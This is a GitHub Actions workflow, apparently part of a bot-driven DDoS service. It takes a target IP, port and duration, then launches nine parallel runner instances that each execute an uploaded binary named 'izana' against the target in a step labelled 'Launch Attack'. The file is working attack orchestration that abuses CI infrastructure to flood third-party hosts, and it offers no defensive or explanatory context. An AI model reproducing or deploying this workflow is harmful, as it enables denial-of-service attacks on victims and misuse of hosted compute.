name: ğŸ—¿ IZANA KING
on: 
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'ğŸ¯ Target IP Address'
        required: true
        type: string
      target_port: 
        description: 'ğŸ”Œ Target Port'
        required: true
        type: string
      attack_duration:
        description: 'â° Attack Duration (seconds)'
        required: true
        type: string

permissions:
  contents: read

jobs:
  fire:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9]
    steps:
      - name: ğŸ—¿ Checkout Repository
        uses: actions/checkout@v4
        
      - name: ğŸ”¥ Verify Binary
        run: |
          if [ ! -f "izana" ]; then
            echo "âŒ ERROR: Binary 'izana' not found!"
            echo "ğŸ’¡ Use /addbinary command to upload binary first"
            exit 1
          fi
          
          chmod +x izana
          
          if ! file izana | grep -q "executable"; then
            echo "âš ï¸ WARNING: File may not be executable binary"
          fi
          
          echo "âœ… Binary verified: $(file izana)"
          echo "ğŸ“Š Size: $(du -h izana | cut -f1)"
          
      - name: ğŸ’¥ Launch Attack
        timeout-minutes: 5
        continue-on-error: true
        run: |
          echo "ğŸ¯ Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
          echo "â° Duration: ${{ inputs.attack_duration }} seconds"
          echo "ğŸ”¢ Instance: ${{ matrix.instance }}"
          echo "ğŸ”¥ Executing attack..."
          
          ./izana "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.attack_duration }}" 3000
          
          echo "âœ… Attack completed on instance ${{ matrix.instance }}"
